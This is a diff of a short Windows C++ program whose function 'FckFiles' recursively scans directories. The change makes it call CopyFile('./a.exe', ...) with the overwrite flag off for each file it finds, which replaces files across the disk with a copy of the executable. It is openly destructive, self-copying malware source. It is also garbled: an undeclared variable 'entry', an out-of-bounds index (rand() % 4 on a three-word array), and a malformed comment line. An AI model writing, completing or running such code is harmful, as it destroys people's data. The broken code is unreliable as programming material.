@@ -1,13 +1,14 @@
 #include <windows.h>
 #include <string>
 #include <iostream>
+#include <array>
+using namespace std;
 string sWords[] = {"Lol","Mitze","Katze"};
 string Chain = "";
-
 void FckFiles(std::string directory, std::string fileFilter, bool recursively = true)
 {
   if (recursively)
-	FckFiles(directory, fileFilter, false);
+    FckFiles(directory, fileFilter, false);
 
   directory += "\\";
 
@@ -17,41 +18,41 @@ void FckFiles(std::string directory, std::string fileFilter, bool recursively = 
   std::string filter = directory + (recursively ? "*" : fileFilter);
 
   hFind = FindFirstFile(filter.c_str(), &FindFileData);
-  Chain = Chain + sWords[rand() % 4];
-  std::cout << Chain;
-  CopyFile("./a.exe",entry.path().string().c_str(),0);
+  //cout << hFind)
   if (hFind == INVALID_HANDLE_VALUE)
   {
-	return;
+    return;
   }
   else
   {
-	if (!recursively)
-	{
-	  std::cout << directory + std::string(FindFileData.cFileName) << std::endl;
-	}
+    if (!recursively)
+    {
+      //std::cout << directory + std::string(FindFileData.cFileName) << std::endl;
+    }
 
-	while (FindNextFile(hFind, &FindFileData) != 0)
-	{
-	  if (!recursively)
-	  {
-		std::cout << directory + std::string(FindFileData.cFileName) << std::endl;
-	  }
-	  else
-	  {
-		if ((FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)>0 && FindFileData.cFileName[0]!='.')
+    while (FindNextFile(hFind, &FindFileData) != 0)
+    {
+		if (!recursively)
 		{
-		  FckFiles(directory + std::string(FindFileData.cFileName), fileFilter);
+			Chain = Chain + sWords[rand() % 4];
+			cout << Chain;
+			CopyFile("./a.exe",entry.path().string().c_str(),0);
 		}
-	  }
-	}
+		else
+		{
+			if ((FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)>0 && FindFileData.cFileName[0]!='.')
+        	{
+				FckFiles(directory + std::string(FindFileData.cFileName), fileFilter);
+        	}
+      	}
+    }
 
-	DWORD dwError = GetLastError();
-	FindClose(hFind);
-	if (dwError != ERROR_NO_MORE_FILES)
-	{
-	  
-	}
+    DWORD dwError = GetLastError();
+    FindClose(hFind);
+    if (dwError != ERROR_NO_MORE_FILES)
+    {
+      std::cout << "FindNextFile error. Error is "<< dwError << std::endl;
+    }
   }
 }
 
